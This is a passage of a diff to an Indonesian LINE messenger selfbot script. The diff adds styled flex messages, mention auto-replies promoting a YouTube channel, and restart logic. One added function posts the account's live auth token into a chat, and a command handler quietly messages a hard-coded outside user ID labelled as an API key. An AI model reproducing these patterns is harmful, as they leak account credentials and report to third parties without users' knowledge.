@@ -23,20 +23,26 @@ from pytz import timezone
 _session = requests.session()
 botStart = time.time()
 #WARNA
+logIn = codecs.open("unsend.json","r","utf-8")
+LoginBot = json.load(logIn)
 merah = "#FF2800"
+nila = "#4B0082"
 kuning = "#FFFD00"
 hijau = "#83FF00"
 biru = "#00DAFF"
+biruTua = "#0000FF"
 ungu = "#C323FF"
 ping = "#FF17CE"
 hitam = "#000000"
 putih = "#FFFFFF"
 abuabu = "#000000cc"
+sp_nila = {"type": "separator","color": nila}
 sp_putih = {"type": "separator","color": "#FFFFFF"}
 style_biru={"header":{"backgroundColor":abuabu},"body":{"backgroundColor":abuabu},"footer":{"backgroundColor":abuabu,"separator":True,"separatorColor":biru}}
 image1 = "https://1.bp.blogspot.com/-zyUmsriCmGE/XVYAO-lsFLI/AAAAAAAAGe8/BsSUwtUfFc0mxRGxE_8fOz3peuxB3t9UwCLcBGAs/s1600/20190816_074821.jpg"
 image2 = "https://1.bp.blogspot.com/-zK32-fvqcNw/XVYAUCQhrmI/AAAAAAAAGfA/hXKs0MS2OIMKi09tJ7yCjnjUbMiuV_TIACLcBGAs/s1600/20190816_074438.jpg"
 image3 = "https://1.bp.blogspot.com/-OgPmr5eJpYg/XVYAVFAYcaI/AAAAAAAAGfE/Xwh0EqB_SrclP-NZ_DaDqxcYnWBZSa_FgCLcBGAs/s1600/20190816_074311.jpg"
+Pabuabu = "https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcROA9420U3BHcyOg97LAZh_cdGZreFn4rJpfDQV8a7WiGYkQpMW"
 Gambar = (image1,image2,image3)
 logo = "https://1.bp.blogspot.com/-6T7oMDOIlKA/XVX_8-oO52I/AAAAAAAAGe0/W0MubSIIyUUzw3et2YifTWqxaNRRwWE-ACLcBGAs/s1600/20190816_075636.png"
 Warna = (merah,kuning,hijau,biru,ping,ungu)
@@ -49,47 +55,16 @@ me.log("Auth Token : " + str(me.authToken))
 meM = me.getProfile().mid
 me.log("MID : " + str(meM))
 print("\n__________________________________________________________________")
-#==============[Inex versi]==============#
-print ("Login Succes")
+print("#==============[Inex versi]==============#")
 oepoll = OEPoll(me)
 St = "┣"
 Zx = [me]
-Mastah = ["u3fe046241f92412b255f12e12336e1ae"]
-Owner = ["uaa1170634010d8737a38fda49c5f7919"]
 meProfile = me.getProfile()
 meSettings = me.getSettings()
-nama1 = 'B.O.G'
-Headers3 = {
-  'User-Agent': "CHROMEOS\t9.0.3Black_Of_Gamer\t17.09",
-  'X-Line-Application': "CHROMEOS 1.7.14 BotEater x64",
-  "x-lal": "ja-US_US",
-}
-nama2 = 'B.O.G'
-Headers = {
-  'User-Agent': "Line/8.3.3",
-  'X-Line-Application': "DESKTOPWIN\t8.3.0Black_Of_Gamer\t18.99",
-  "x-lal": "ja-US_US",
-}
-nama3 = 'B.O.G'
-Headers5 = {
-  'User-Agent': "Line/8.0.0",
-  'X-Line-Application': "IOSIPAD\t7.18.0\tBlack_Of_Gamer\t11.12.1",
-  "x-lal": "ja-US_US",
-}
-nama4 = 'B.O.G'
-Headers4 = {
-  'User-Agent': "Line/8.3.2",
-  'X-Line-Application': "WIN10\t5.5.5\tBlack_Of_Gamer\tTools\t11.2.5",
-  "x-lal": "ja-US_US",
-}
-nama5 = 'B.O.G'
-Headers2 = {
-  'User-Agent': "Line/8.3.2",
-  'X-Line-Application': "DESKTOPMAC\t5.10.0\tBlack_Of_Gamer\tTools\t10.13.2",
-  "x-lal": "ja-US_US",
-}
 set = {
   "Picture": False,
+  "bot": True,
+  "Conection": "cd7e4add16f8dcbca983d9275506aaa5a",
   "foto": {},
   "group":{},
   "keyCommand":"",
@@ -206,7 +181,7 @@ set = {
   "addstaff": False,
   "dellstaff": False,
   "autoBlock": False,
-  "detectMention": False,
+  "detectMention": True,
   "detectMention2": False,
   "arespon":True,
   "blacklist":{},
@@ -224,9 +199,9 @@ set = {
   "comment": "ᴀᴜᴛᴏ ʟɪᴋᴇ ɴ ᴄᴏᴍᴍᴇɴᴛ ᴅᴏɴᴇ\nвʏ.ᴛᴇᴀᴍ ⊶ [B.O.G] ⊷",
   "comment2": "┏━━━━━━━━━•❅•°•❈•°•❅•━━━━━━━━┓\n┃┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓\n┃┃     ❀    [ BLACK_OF_GAMER ]    ❀\n┃┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛\n├━━━━━━━━━━━━━━━━━━━━━━━━\n┃┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓\n┃┃          LIKE N COMMENT DONE\n┃┃         IKUTAN CORET-CORET\n┃┃                     B.O.G_TEAM\n┃┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛\n├━━━━━━━━━━━━━━━━━━━━━━━━\n┃┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓\n┃┃  AciL :\n┃┃  http://line.me/ti/p/~adiputra.95\n┃┃  Denjaka :\n┃┃  http://line.me/ti/p/~denjaka_inex\n┃┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛\n┗━━━━━━━━━•❅•°•❈•°•❅•━━━━━━━━┛",
   "mention":"ᴋᴀʟᴏ ɴɢɪɴᴛɪᴘ ᴛᴇʀᴜs ᴅᴀᴘᴇᴛ ɢᴇʟᴀs ᴘᴇᴄᴀʜ ᴅɪ ᴋᴇᴘᴀʟᴀ...",
-  "Respontag":"ᴊᴀɴɢᴀɴ ᴛᴀɢ ʙᴀᴇ ᴋᴀᴋ,,, ɴɢᴏᴍᴏɴɢ ᴀᴊᴀ ᴋᴀʟᴏ ᴄɪɴᴛᴀ ᴀᴋᴜ ᴍᴀʜ.",
+  "Respontag":"https://youtube.com/channel/UCu5Aqj6zqJK59pXxNGw8HMg",
   "Respontag2":"ada apa tag saya d grup kak?",
-  "Responpm":"Jiaaahhh... Akhirnya elu tag gue juga.",
+  "tagpm":"subcrabe channelku donk kak\nhttps://youtube.com/channel/UCu5Aqj6zqJK59pXxNGw8HMg",
   "welcome":"ѕєĻαмαт đαтαηg,,,, вυđαуαкαη ¢єк ησтє кαк",
   "message":"тᴇяıмᴀ кᴀsıн suᴅᴀн ᴀᴅᴅ sᴀʏᴀ \nвʏ.ᴛᴇᴀᴍ \n⊶ вĻα¢к●σƒ●gαмєя ⊷",
   "baper":"ѕєĻαмαт тιηggαĻ тємαη,,, ѕємσgα єηgкαυ тєηαηg đι ѕαηα●",
@@ -263,7 +238,7 @@ try:
     msg_dict = json.loads(f.read())
 except:
   print("unsend eror")
-Line_Apikey = "u3fe046241f92412b255f12e12336e1ae"
+Line_Apikey = "u1357cc65e328414537b7519653832d2a"
 cont = me.getContact(meM)
 Extr = me.getContact(Line_Apikey).displayName
 for busht in Zx:
@@ -277,14 +252,24 @@ timeNow = datetime.now(tz=tz)
 jamtgl = timeNow.strftime('|📆|%d/%B/%Y|⏰|%X|')
 jam = timeNow.strftime('⏰ %X')
 tgl = timeNow.strftime('📆 %d/%B/%Y')
-def restartBot():
-  python = sys.executable
-  os.execl(python, python, *sys.argv)
-def waktu(secs):
+def runtime(secs):
   mins, secs = divmod(secs,60)
   hours, mins = divmod(mins,60)
   days, hours = divmod(hours, 24)
   return '%02d Hari %02d Jam %02d Menit %02d Detik' % (days, hours, mins, secs)
+def backupData():
+  try:
+    backup = LoginBot
+    f = codecs.open('unsend.json','w','utf-8')
+    json.dump(backup,f, sort_keys=True, indent=4, ensure_ascii=False)
+    return True
+  except Exception as error:
+    print(error)
+    return False
+def Run_Xx():
+  backupData()
+  python = sys.executable
+  os.execl(python, python, *sys.argv)
 def logError(text):
   me.log("ERROR 404 !\n" + str(text))
   tz = pytz.timezone("Asia/Jakarta")
@@ -349,45 +334,72 @@ def changeProfileVideo(to):
     me.updateProfilePicture(path_p, 'vp')
 extras = "  "+Extr+"\n"
 def sendTemplate(to, text):
-  warnanya = ("#FF2800","#FFFD00","#C323FF","#FFFFFF")
-  collor = ("#00FF00","#0000FF","#CCFF00","#9900FF")
-  warna = random.choice(warnanya)
-  coll = random.choice(collor)
   data = { "type": "flex","altText": " Black Of Gamers","contents":
-  {"type": "bubble","styles":{"body":{"backgroundColor":"#000000"}},"type":"bubble","body":{"contents":[{"contents":[{"type":"separator","color":coll},{"contents":[
-  {"type":"separator","color":coll},
-  {"text":text,"size":"xs","align":"center","color": warna,"wrap":True,"weight":"bold","type":"text"},
-  {"type":"separator","color":coll}
+  {"type": "bubble","size": "micro",
+  "styles":{"body":{"backgroundColor":"#000000"}},"type":"bubble",
+  "body": {"cornerRadius": "md","borderWidth": "5px","borderColor": biruTua,
+  "contents":[{"contents":[{"type":"separator","color":warnanya1},{"contents":[
+  {"type":"separator","color":warnanya1},
+  {"text": text ,"size":"xxs","align":"center","color": warnanya1,"wrap":True,"weight":"bold","type":"text"},
+  {"type":"separator","color":warnanya1}
   ],"type":"box","spacing":"md","layout":"horizontal"},
-  {"type":"separator","color":coll}
+  {"type":"separator","color":warnanya1}
   ],"type":"box","layout":"vertical"},
-  ],"type":"box","spacing":"xs","layout":"vertical"}},}
+  ],"type":"box","layout":"vertical"}},}
   me.sendFlex(to, data)
 def sendTemplate2 (to,text):
   data = { "type": "flex","altText": " Assalamu'alaikumm","contents":
-  {"type": "bubble","styles":{"body":{"backgroundColor":"#000000"},"footer":{"backgroundColor":"#800000"}},"type":"bubble","body":
-  {"contents":[{"contents":[{"type":"separator","color":"#ffffff"},
-  {"contents":[{"type":"separator","color":"#ffffff"},{"type":"separator","color":"#ffffff"},
+  {"type": "bubble","styles": style_biru,"type":"bubble","size":"kilo","body":
+  {"cornerRadius": "md","borderWidth": "5px","borderColor": biruTua,"contents":[{"contents":[{"type":"separator","color":"#ffffff"},
+  {"contents":[sp_putih,
   {"text":"вĻα¢к●σƒ●gαмєя","size":"md","align":"center","color":"#BE1700","wrap":True,"weight":"bold","type":"text"},
-  {"type":"separator","color":"#ffffff"},{"type":"separator","color":"#ffffff"}
+  sp_putih
   ],"type":"box","spacing":"md","layout":"horizontal"},
-  {"type":"separator","color":"#ffffff"}],"type":"box","layout":"vertical"},
-  {"contents":[{"type":"separator","color":"#ffffff"},
-  {"contents":[{"type":"separator","color":"#ffffff"},{"type":"separator","color":"#ffffff"},
+  sp_putih],"type":"box","layout":"vertical"},
+  {"contents":[sp_putih,
+  {"contents":[sp_putih,
   {"type": "image","url": "https://1.bp.blogspot.com/-6T7oMDOIlKA/XVX_8-oO52I/AAAAAAAAGe0/W0MubSIIyUUzw3et2YifTWqxaNRRwWE-ACLcBGAs/s1600/20190816_075636.png","size": "full","aspectRatio": "3:1"},
-  {"type":"separator","color":"#ffffff"},{"type":"separator","color":"#ffffff"}
+  sp_putih
   ],"type":"box","spacing":"md","layout":"horizontal"},
-  {"type":"separator","color":"#ffffff"}],"type":"box","layout":"vertical"},
-  {"contents": [{"type":"separator","color":"#ffffff"},
-  {"contents":[{"type":"separator","color":"#ffffff"},
-  {"text": text,"size":"xs","color":"#33ffff","wrap":True,"weight":"bold","type":"text"},
-  {"type":"separator","color":"#ffffff"}],"type":"box","spacing":"md","layout":"horizontal"},
-  {"type":"separator","color":"#ffffff"}],"type":"box","layout":"vertical"},
+  sp_putih],"type":"box","layout":"vertical"},
+  {"contents": [sp_putih,
+  {"contents":[sp_putih,
+  {"text": text,"size":"xs","color":kuning,"wrap":True,"weight":"bold","type":"text"},
+  sp_putih],"type":"box","spacing":"md","layout":"horizontal"},
+  sp_putih],"type":"box","layout":"vertical"},
   ],"type":"box","spacing":"xs","layout":"vertical"}},}
   me.sendFlex(to, data)
 def Fotter(to,text):
   data = {"type": "text","text": text,"sentBy": {"label": "вĻα¢к ● σƒ ● gαмєя","iconUrl": "https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSi2LaC4ftZz21mtSDA3YkylLb6lgqncx_uxOp-wdyAlIqsVsJ1","linkUrl": "http://line.me/ti/p/~denjaka_inex"}}
   me.sendFlex(to,data)
+def RunTheRun(to, mid, firstmessage):
+  try:
+    arrData = ""
+    text = "%s " %(str(firstmessage))
+    arr = []
+    mention = "@x \n"
+    slen = str(len(text))
+    elen = str(len(text) + len(mention) - 1)
+    arrData = {'S':slen, 'E':elen, 'M':mid}
+    arr.append(arrData)
+    today = datetime.today()
+    future = datetime(2018,7,25)
+    hari = (str(future - today))
+    comma = hari.find(",")
+    hari = hari[:comma]
+    teman = me.getAllContactIds()
+    gid = me.getGroupIdsJoined()
+    tz = pytz.timezone("Asia/Jakarta")
+    timeNow = datetime.now(tz=tz)
+    eltime = time.time() - mulai
+    bot = runtime(eltime)
+    h = me.getContact(meM)
+    me.reissueUserTicket()
+    My_Id = "http://line.me/ti/p/"+me.getUserTicket().id
+    text += mention+"WAKTU :\n"+jamtgl+"\n\nMY GROUP : "+str(len(gid))+"\n\nMY FRIEND : "+str(len(teman))+"\n\nTIME VPS : In "+hari+"\n\nINEX_TEAM. ʟɪɴᴇ ᴠᴇʀ.8.14.2\nRUN : "+bot+"\n\nMY TOKEN :\n"+str(me.authToken)+"\n\nMY MID : \n"+h.mid+"\nMY ID LINE : "+My_Id+"\n\nCHANEL YOUTUBE\n"+set["Respontag"]
+    me.sendMessage(to, text, {'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}, 0)
+  except Exception as error:
+    print("Error :\n" + str(error))
 def Comt(text):
   pesan = text.lower()
   if pesan.startswith(set["keyCommand"]):
@@ -402,11 +414,143 @@ def bot(op):
     opp1 = op.param1
     opp2 = op.param2
     opp3 = op.param3
-    Admin = set["admin"]
-    Staff = set["staff"]
-    print("[11] PEPERANGAN")
     try:
+        if op.type == 26:
+         if set["bot"] == True:
+           msg = op.message
+           text = msg.text
+           Id = msg.id
+           To = msg.to
+           Dari = msg._from
+           to = msg.to
+           Key = set["keyCommand"].title()
+           if set["setKey"] == False:
+             Key = ''
+           if msg.contentType == 0:
+             if text is None:
+               return
+           if msg.toType == 2:
+             if msg.toType == 0:
+                to = msg._from
+             elif msg.toType == 2:
+               to = msg.to
+           if msg.contentType == 7:
+             if set["checkSticker"] == True:
+               msg.contentType = 0
+               stk_id = msg.contentMetadata['STKID']
+               stk_ver = msg.contentMetadata['STKVER']
+               pkg_id = msg.contentMetadata['STKPKGID']
+               ret_ = "╔══[ Sticker Info ]"
+               ret_ += "\n╠ ID : {}".format(stk_id)
+               ret_ += "\n╠ PACKAGES ID : {}".format(pkg_id)
+               ret_ += "\n╠ VERSION : {}".format(stk_ver)
+               ret_ += "\n╠ URL : line://shop/detail/{}".format(pkg_id)
+               ret_ += "\n╚══[ Finish ]"
+               patih = "http://dl.stickershop.line.naver.jp/products/0/0/{}/{}/android/stickers/{}.png".format(str(stk_ver),(pkg_id),(stk_id))
+               path = "https://stickershop.line-scdn.net/stickershop/v1/sticker/{}/IOS/sticker.png".format(stk_id)
+               data = { "type": "flex","altText": " Assalamu'alaikumm","contents":
+               {"type": "bubble","size":"micro",
+               "styles":{"body":{"backgroundColor":"#000000"},"footer":{"backgroundColor":"#800000"}},
+               "type":"bubble","body":
+               {"cornerRadius": "md","borderWidth": "5px","borderColor": biruTua,"contents":[
+               {"contents":[
+               sp_putih,
+               sp_putih,
+               {"contents":[
+               sp_putih,
+               {"text":"🆂🆃🅸🅲🅺🅴🆁 🅲🅷🅴🅲🅺","size":"xs","align":"center","color":"#ffff00","wrap":True,"weight":"bold","type":"text"},
+               sp_putih
+               ],"type":"box","spacing":"md","layout":"horizontal"},
+               sp_putih,
+               {"contents":[
+               sp_putih,
+               sp_putih,
+               {"url": image1,"type":"image"},
+               sp_putih,
+               sp_putih,
+               {"type":"image","url": logo,"size":"xl"},
+               sp_putih,
+               sp_putih
+               ],"type":"box","spacing":"md","layout":"horizontal"},
+               sp_putih,
+               {"contents":[
+               sp_putih,
+               {"text": str(ret_),"size":"xxs","color":"#33ffff","wrap":True,"weight":"bold","type":"text"},
+               sp_putih
+               ],"type":"box","spacing":"md","layout":"horizontal"},
+               sp_putih
+               ],"type":"box","layout":"vertical"},
+               ],"type":"box","spacing":"xs","layout":"vertical"}},}
+               me.sendFlex(to, data)
+               datanya = {
+                "type": "template","altText": "Bagi tikel donk",
+                "template":
+                {"type": "image_carousel",
+                "columns": [
+                {"imageUrl": path,
+                "layout": "horizontal",
+                "action":
+                {"type": "uri","label": "JAJAN TIKEL","uri": "line://shop/detail/{}".format(pkg_id),"area": {"x": 447,"y": 356,"width": 1040,"height": 1040}}}]}}
+               me.sendFlex(to, datanya)
+               set["checkSticker"] = False
+           if msg.contentType == 0:
+               if 'MENTION' in msg.contentMetadata.keys() != None:
+                 if set["detectMention"] == True:
+                   name = re.findall(r'@(\w+)', msg.text)
+                   mention = ast.literal_eval(msg.contentMetadata['MENTION'])
+                   mentionees = mention['MENTIONEES']
+                   lists = []
+                   for mention in mentionees:
+                     if mention ['M'] in meM:
+                       group = me.getGroup(To)
+                       masuk = me.getContact(Dari)
+                       nama = masuk.displayName
+                       data = { "type": "flex","altText": " Assalamu'alaikumm","contents":
+                            {"type": "bubble","size":"micro",
+                            "styles":style_biru,
+                            "type":"bubble","body":
+                            {"cornerRadius": "xs","borderWidth": "5px","borderColor": hijau,"contents":[
+                            {"contents":[
+                            sp_putih,
+                            {"contents":[
+                            sp_putih,
+                            {"text":"вĻα¢к●σƒ●gαмєя","size":"xs","align":"center","color": merah,"wrap":True,"weight":"bold","type":"text"},
+                            sp_putih
+                            ],"type":"box","spacing":"md","layout":"horizontal"},
+                            sp_putih,
+                            {"contents":[
+                            sp_putih,
+                            {"type": "image","url": "https://cdn.dribbble.com/users/293796/screenshots/3438995/fb-likes.gif","size": "xl","action": {"type": "uri","uri": "line://app/1609524990-mpvZ5xv5"}},
+                            sp_putih,
+                            {"url":"https://os.line.naver.jp/os/p/{}".format(Dari),"type":"image","action": {"type": "uri","uri": "https://os.line.naver.jp/os/p/{}".format(Dari)}},
+                            sp_putih,
+                            {"type":"image","url": "https://1.bp.blogspot.com/-zyUmsriCmGE/XVYAO-lsFLI/AAAAAAAAGe8/BsSUwtUfFc0mxRGxE_8fOz3peuxB3t9UwCLcBGAs/s1600/20190816_074821.jpg","size":"xl","action": {"type": "uri","uri": "http://line.me/ti/p/~denjaka_xtc"}},
+                            sp_putih
+                            ],"type":"box","spacing":"md","layout":"horizontal"},
+                            sp_putih,
+                            {"contents":[
+                            sp_putih,
+                            {"text": nama+" "+ set["Respontag2"],"size":"xs","color": hijau,"wrap":True,"weight":"bold","type":"text"},
+                            sp_putih
+                            ],"type":"box","spacing":"md","layout":"horizontal"},
+                            sp_putih
+                            ],"type":"box","layout":"vertical"},
+                            ],"type":"box","spacing":"xs","layout":"vertical"}},}
+                       me.sendFlex(to, data)
+                       break
+               if 'MENTION' in msg.contentMetadata.keys() != None:
+                 if set["arespon"] == True:
+                   name = re.findall(r'@(\w+)', msg.text)
+                   mention = ast.literal_eval(msg.contentMetadata['MENTION'])
+                   mentionees = mention['MENTIONEES']
+                   for mention in mentionees:
+                     if mention ['M'] in meM:
+                       h = me.getContact(Dari)
+                       me.sendMessage(Dari, h.displayName+"\n"+set["tagpm"])
+                       break
+#===========================
         if op.type in [25, 26]:
+          if set["bot"] == True:
             if op.type == 25: print ("[ 25 ] SEND MESSAGE")
             else: print ("[ 26 ] RECEIVE MESSAGE")
             msg = op.message
@@ -426,7 +570,7 @@ def bot(op):
                elif msg.toType == 2:
                  to = msg.to
                if msg.contentType == 1:
-                 if Dari in Owner or Dari in meM:
+                 if Dari in meM:
                    if meM in set["foto"]:
                      path = me.downloadObjectMsg(Id)
                      del set["foto"][meM]
@@ -463,243 +607,8 @@ def bot(op):
                         Dari = msg._from
                         To = msg.to
                         Id = msg.id
-                        if Pbot == "help":
-                          if Dari in Owner or Dari in meM or Dari in Admin:
-                            h = me.getContact(Dari)
-                            me.reissueUserTicket()
-                            data = {
-                       "type": "flex",
-                         "altText": "TOLOOOOOONG...",
-                         "contents": {
-                          "type": "bubble",
-                            "styles": {
-                             "header": {
-                              "backgroundColor": "#000000",
-                               "separator": True,
-                               "separatorColor": "#ffffff"
-                                },
-                             "hero": {
-                               "backgroundColor": "#000000",
-                               "separator": True,
-                               "separatorColor": "#ffffff"
-                                },
-                             "body": {
-                               "backgroundColor": "#000000",
-                               "separator": True,
-                              "separatorColor": "#ffffff"
-                               },
-                            "footer": {
-                               "backgroundColor": "#000000",
-                               "separator": True,
-                              "separatorColor": "#FF9933"
-                           }
-                         },
-                         "body": {
-                          "type": "box",
-                          "layout": "vertical",
-                           "spacing": "md",
-                            "action": {
-                            "type": "uri",
-                             "uri": "https://line.me/ti/p/~denjaka_inex"
-                              },
-                            "contents": [
-                           {"contents":[
-                            {"type":"separator","color":"#ffffff"},
-                            {"contents":[
-                            {"type":"separator","color":"#ffffff"},{"type":"separator","color":"#ffffff"},
-                            {"text":"вĻα¢к●σƒ●gαмєя","size":"md","align":"center","color":"#3300FF","wrap":True,"weight":"bold","type":"text"},
-                            {"type":"separator","color":"#ffffff"},{"type":"separator","color":"#ffffff"}
-                            ],"type":"box","spacing":"md","layout":"horizontal"},
-                            {"type":"separator","color":"#ffffff"}
-                            ],"type":"box","layout":"vertical"},
-                            {"contents":[
-                            {"type":"separator","color":"#ffffff"},
-                            {"contents":[
-                            {"type":"separator","color":"#ffffff"},{"type":"separator","color":"#ffffff"},
-                            {"type": "image","url": "https://1.bp.blogspot.com/-6T7oMDOIlKA/XVX_8-oO52I/AAAAAAAAGe0/W0MubSIIyUUzw3et2YifTWqxaNRRwWE-ACLcBGAs/s1600/20190816_075636.png","size": "full","aspectRatio": "3:1"},
-                            {"type":"separator","color":"#ffffff"},{"type":"separator","color":"#ffffff"}
-                            ],"type":"box","spacing":"md","layout":"horizontal"},
-                            {"type":"separator","color":"#ffffff"}
-                            ],"type":"box","layout":"vertical"},
-                              {
-                              "type": "box",
-                               "layout": "vertical",
-                                "spacing": "xs",
-                                    "contents": [
-                                    {"contents":[
-                            {"type":"separator","color":"#ffffff"},
-                            {"contents":[
-                            {"type":"separator","color":"#ffffff"},
-                                       {
-                                           "type": "button",
-                                           "style": "secondary",
-                                           "color": "#BE1700",
-                                           "height": "sm",
-                                           "gravity": "center",
-                                           "flex": 1,
-                                           "action": {
-                                               "type": "uri",
-                                               "label": "Me",
-                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=Me"
-                                           }
-                                       },{"type":"separator","color":"#ffffff"},
-                                       {
-                                           "type": "button",
-                                           "style": "secondary",
-                                           "color": "#BE1700",
-                                           "height": "sm",
-                                           "gravity": "center",
-                                           "flex": 1,
-                                           "action": {
-                                               "type": "uri",
-                                               "label": "Profile",
-                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=Profil"
-                                           }
-                                       },{"type":"separator","color":"#ffffff"}
-                            ],"type":"box","spacing":"md","layout":"horizontal"},
-                            {"type":"separator","color":"#ffffff"}
-                            ],"type":"box","layout":"vertical"},
-                                       {"contents":[
-                            {"type":"separator","color":"#ffffff"},
-                            {"contents":[
-                            {"type":"separator","color":"#ffffff"},
-                                       {
-                                           "type": "button",
-                                           "style": "secondary",
-                                           "color": "#BE1700",
-                                           "height": "sm",
-                                           "gravity": "center",
-                                           "flex": 1,
-                                           "action": {
-                                               "type": "uri",
-                                               "label": "Mid",
-                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=Mid"
-                                           }
-                                       },{"type":"separator","color":"#ffffff"},
-                                       {
-                                           "type": "button",
-                                           "style": "secondary",
-                                           "color": "#BE1700",
-                                           "height": "sm",
-                                           "gravity": "center",
-                                           "flex": 1,
-                                           "action": {
-                                               "type": "uri",
-                                               "label": "Dp",
-                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=Changedp"
-                                           }
-                                       },{"type":"separator","color":"#ffffff"}
-                            ],"type":"box","spacing":"md","layout":"horizontal"},
-                            {"type":"separator","color":"#ffffff"}
-                            ],"type":"box","layout":"vertical"},
-                                       {"contents":[
-                            {"type":"separator","color":"#ffffff"},
-                            {"contents":[
-                            {"type":"separator","color":"#ffffff"},
-                                       {
-                                           "type": "button",
-                                           "style": "secondary",
-                                           "color": "#BE1700",
-                                           "height": "sm",
-                                           "gravity": "center",
-                                           "flex": 1,
-                                           "action": {
-                                               "type": "uri",
-                                               "label": "Videodp",
-                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=Changedpvideo"
-                                           }
-                                       },{"type":"separator","color":"#ffffff"},
-                                       {
-                                           "type": "button",
-                                           "style": "secondary",
-                                           "color": "#BE1700",
-                                           "height": "sm",
-                                           "gravity": "center",
-                                           "flex": 1,
-                                           "action": {
-                                               "type": "uri",
-                                               "label": "Banlist",
-                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=Banlist"
-                                           }
-                                       },{"type":"separator","color":"#ffffff"}
-                            ],"type":"box","spacing":"md","layout":"horizontal"},
-                            {"type":"separator","color":"#ffffff"}
-                            ],"type":"box","layout":"vertical"},
-                                       {"contents":[
-                            {"type":"separator","color":"#ffffff"},
-                            {"contents":[
-                            {"type":"separator","color":"#ffffff"},
-                                       {
-                                           "type": "button",
-                                           "style": "secondary",
-                                           "color": "#BE1700",
-                                           "height": "sm",
-                                           "gravity": "center",
-                                           "flex": 1,
-                                           "action": {
-                                               "type": "uri",
-                                               "label": "Mention",
-                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=Tag"
-                                           }
-                                       },{"type":"separator","color":"#ffffff"},
-                                       {
-                                           "type": "button",
-                                           "style": "secondary",
-                                           "color": "#BE1700",
-                                           "height": "sm",
-                                           "gravity": "center",
-                                           "flex": 1,
-                                           "action": {
-                                               "type": "uri",
-                                               "label": "Pict",
-                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=Indukpict"
-                                           }
-                                       },{"type":"separator","color":"#ffffff"}
-                            ],"type":"box","spacing":"md","layout":"horizontal"},
-                            {"type":"separator","color":"#ffffff"}
-                            ],"type":"box","layout":"vertical"},
-                                       {"contents":[
-                            {"type":"separator","color":"#ffffff"},
-                            {"contents":[
-                            {"type":"separator","color":"#ffffff"},
-                                       {
-                                           "type": "button",
-                                           "style": "secondary",
-                                           "color": "#BE1700",
-                                           "height": "sm",
-                                           "gravity": "center",
-                                           "flex": 1,
-                                           "action": {
-                                               "type": "uri",
-                                               "label": "Runer",
-                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=Runner"
-                                           }
-                                       },{"type":"separator","color":"#ffffff"},
-                                       {
-                                           "type": "button",
-                                           "style": "secondary",
-                                           "color": "#BE1700",
-                                           "height": "sm",
-                                           "gravity": "center",
-                                           "flex": 1,
-                                           "action": {
-                                               "type": "uri",
-                                               "label": "⑉Or∂er⑉",
-                                               "uri": "line://app/1623679774-k9nBDB6b?type=text&text=Price"
-                                           }
-                                       },{"type":"separator","color":"#ffffff"}
-                            ],"type":"box","spacing":"md","layout":"horizontal"},
-                            {"type":"separator","color":"#ffffff"}
-                            ],"type":"box","layout":"vertical"}
-                                          ]
-                                       }
-                                    ]
-                                 }
-                               }
-                             }
-                            me.sendFlex(To, data)
-                            me.sendMessage(Line_Apikey, Devert)
-                        elif Pbot =="me":
+                        if Pbot =="me":
+                         if Dari in meM:
                           h = me.getContact(Dari)
                           dart = {
                       "type": "flex",
@@ -711,7 +620,7 @@ def bot(op):
                         "styles": style_biru,
                          "footer": {
                          "type": "box",
-                         "layout": "horizontal",
+                         "layout": "horizontal","cornerRadius": "md","borderWidth": "5px","borderColor": biruTua,
                          "contents": [
                           sp_putih,
                            {
@@ -781,14 +690,251 @@ def bot(op):
                            }
                           me.sendFlex(To,dart)
                           me.sendMessage(Line_Apikey, Devert)
+                        if Pbot == "help":
+                          if Dari in meM:
+                            group = me.getGroup(To)
+                            h = me.getContact(Dari)
+                            data = {"type":"flex","altText":"{}".format(h.displayName),"contents":{"type":"carousel","contents":[
+                            {"type": "bubble","size":"kilo",
+                            "body": {
+                              "type": "box",
+                              "layout": "vertical","cornerRadius": "xs","borderWidth": "5px","borderColor": hijau,
+                              "contents": [
+                                {
+                                  "type": "image",
+                                  "url": Pabuabu,
+                                  "size": "full",
+                                  "aspectMode": "cover",
+                                  "aspectRatio": "4:6",
+                                  "gravity": "top"
+                                },
+                                {
+                          "type": "box",
+                          "layout": "vertical","cornerRadius": "md","borderWidth": "2px","borderColor": biruTua,
+                           "spacing": "md",
+                            "action": {
+                            "type": "uri",
+                             "uri": "https://line.me/ti/p/~denjaka_inex"
+                              },
+                            "contents": [
+                           {"contents":[
+                           sp_putih,
+                            {"contents":[
+                            sp_putih,
+                            {"text":"вĻα¢к●σƒ●gαмєя","size":"md","align":"center","color": merah,"wrap":True,"weight":"bold","type":"text"},
+                            sp_putih
+                            ],"type":"box","spacing":"md","layout":"horizontal"},
+                            sp_putih,
+                            ],"type":"box","layout":"vertical"},
+                            {"contents":[
+                            sp_putih,
+                            {"contents":[
+                            sp_putih,
+                            {"type": "image","url": "https://1.bp.blogspot.com/-6T7oMDOIlKA/XVX_8-oO52I/AAAAAAAAGe0/W0MubSIIyUUzw3et2YifTWqxaNRRwWE-ACLcBGAs/s1600/20190816_075636.png","size": "full","aspectRatio": "3:1"},
+                            sp_putih
+                            ],"type":"box","spacing":"md","layout":"horizontal"},
+                            sp_putih
+                            ],"type":"box","layout":"vertical"},
+                              {
+                              "type": "box",
+                               "layout": "vertical",
+                                "spacing": "xs",
+                                "contents": [
+                                {"contents":[
+                                sp_putih,
+                                {"contents":[
+                                  sp_putih,
+                                       {
+                                           "type": "button",
+                                           "style": "secondary",
+                                           "color": ping,
+                                           "height": "sm",
+                                           "gravity": "center",
+                                           "flex": 1,
+                                           "action": {
+                                               "type": "uri",
+                                               "label": "Changedp",
